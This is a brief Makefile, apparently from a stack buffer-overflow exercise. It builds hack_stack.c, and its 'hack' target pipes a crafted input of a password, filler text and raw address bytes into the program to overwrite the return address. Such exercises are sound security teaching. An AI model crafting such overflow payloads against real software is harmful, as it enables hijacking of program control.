.PHONY: all
all:
	@ gcc -g hack_stack.c -o hack_stack 2> /dev/null

.PHONY: clean
clean:
	@ rm hack_stack

.PHONY: hack
hack:
	/bin/echo -en "potok2\nrandomtextstringinserted\x0c\x09\x40\n" | ./hack_stack
